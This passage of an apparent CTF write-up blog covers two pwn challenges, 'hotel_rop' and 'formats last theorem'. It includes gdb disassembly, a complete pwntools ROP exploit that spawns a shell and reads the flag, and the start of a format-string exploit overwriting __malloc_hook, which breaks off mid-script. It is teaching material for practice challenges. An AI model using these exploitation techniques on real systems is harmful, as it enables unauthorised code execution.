</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000130c</span> <span class="err">&lt;+</span><span class="mi">137</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d66</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001312</span> <span class="err">&lt;+</span><span class="mi">143</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001315</span> <span class="err">&lt;+</span><span class="mi">146</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d5d</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000131b</span> <span class="err">&lt;+</span><span class="mi">152</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131c</span> <span class="err">&lt;+</span><span class="mi">153</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131d</span> <span class="err">&lt;+</span><span class="mi">154</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The california function adds the 4 bytes to the win_land global variable, the 4 bytes were /bin and the next function named silicon_valley adds the remaining 4 bytes /sh\x00 to the win_land making the win_land equals to the /bin/shx00, then there was another function named loss, which was as following:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">loss</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">loss</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001185</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001186</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001189</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000118d</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001190</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">esi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001193</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001196</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001199</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000119b</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0xdeadc0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011a0</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x11d9</span> <span class="p">&lt;</span><span class="no">loss</span><span class="p">+</span><span class="mi">84</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011a2</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe5f</span><span class="p">]</span>        <span class="c1"># 0x2008
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011a9</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011ae</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011b5</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x11d9</span> <span class="p">&lt;</span><span class="no">loss</span><span class="p">+</span><span class="mi">84</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011b7</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe7a</span><span class="p">]</span>        <span class="c1"># 0x2038
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011be</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011c3</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ea6</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011ca</span> <span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1040</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011cf</span> <span class="err">&lt;+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011d4</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1080</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011d9</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011da</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000011db</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>There’s some twist to the loss function, first it expects 2 arguments from the function call then it checks if the sum of 1st and 2nd argument is equals to the 0xdeadc0de if it is, then check if the first argument is equal to the 0x1337c0de once it is, calls the system with the win_land as it’s argument. In order to exploit this, with the gef we find the offset which was 0x28. then we must call californiaand silicon_valley respectively to make the win_land variable equals to /bin/sh then call the loss function.</p>
<p>During the call of the loss function, since we know that it expects the 1st argument to be the 0x1337c0de and the sum of 1st and 2nd should be 0xdeadc0de, we can just find the right value for the second argument by subtracting the 0xdeadc0de from the 0x1337c0de which will be:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0xdeadc0de</span> <span class="p">-</span> <span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl"><span class="nf">$4</span> <span class="err">=</span> <span class="mi">0xcb760000</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Now, the exploit will be:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf1-chall-hotel-rop.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;hotel_rop&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Welcome to Hotel ROP, on main street &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x136d</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;california&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;silicon_valley&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000000140b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1337c0de</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000001409</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcb760000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;loss&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">hotel_rop.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf1-chall-hotel-rop.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">hotel_rop</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x564fdcdc6000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">come</span> <span class="no">here</span> <span class="no">often</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">think</span> <span class="no">you</span> <span class="no">should</span> <span class="no">come</span> <span class="no">here</span> <span class="no">more</span> <span class="no">often.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Welcome</span> <span class="no">to</span> <span class="no">Hotel</span> <span class="no">California</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">can</span> <span class="no">sign</span> <span class="no">out</span> <span class="no">anytime</span> <span class="no">you</span> <span class="no">want</span><span class="p">,</span> <span class="no">but</span> <span class="no">you</span> <span class="no">can</span> <span class="no">never</span> <span class="no">leave</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">want</span> <span class="no">to</span> <span class="no">work</span> <span class="no">for</span> <span class="no">Google</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">ch41n_0f_h0t3ls</span><span class="err">}</span><span class="no">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="formats-last-theorem" class="relative group">Formats last theorem <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#formats-last-theorem" aria-label="Anchor">#</a></span></h3><p>This was another format string challenge, performing the checksec on the binary we get the:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">formats_the_theorem</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Full</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>We have almost all the protections enabled, since RELRO is Full meaning we won’t be able to overwrite the GOT entries and since the challenge description hint us toward the <code>__malloc_hook</code>, we have to go the usual way to overwrite the <code>__malloc_hook</code> with the one_gadget address and call the malloc with the help of printf which will eventually call <code>__malloc_hook</code> resulting in the one_gadget being executed.</p>
<p>Reference: <a href="https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/" target="_blank" rel="noreferrer">https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/</a></p>
<p>Also, since the attachment had the docker container to hint towards LIBC, we can see that the binary was running in the Ubuntu 18.04 container which uses the LIBC 2.27ubuntu1.4 version, there was vuln function, which had format string vulnerabilty:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x70</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000742</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000074b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000074f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000751</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x100</span><span class="p">]</span>        <span class="c1"># 0x858
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000758</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000075d</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000761</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000764</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x136</span><span class="p">]</span>        <span class="c1"># 0x8a1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000076b</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000770</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x610</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000775</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x12b</span><span class="p">]</span>        <span class="c1"># 0x8a7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000077c</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000781</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000785</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000788</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078d</span> <span class="err">&lt;+</span><span class="mi">83</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5f0</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000792</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x11a</span><span class="p">]</span>        <span class="c1"># 0x8b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000799</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000079e</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x10e</span><span class="p">]</span>        <span class="c1"># 0x8b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007a5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007aa</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x751</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">23</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>So, in order to exploit this binary, we first needed a LIBC leak to determine the base address of LIBC so that we will be able to determine the __malloc_hook and one_gadget address. Surprisingly, one of the LIBC address at the offset of 2, which I used to get the base address of the LIBC, then using the pwntools fmtstr_payload to write 2 bytes at a time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./formats_the_theorem&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-formats-last-theorem.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7482</span><span class="p">)</span>
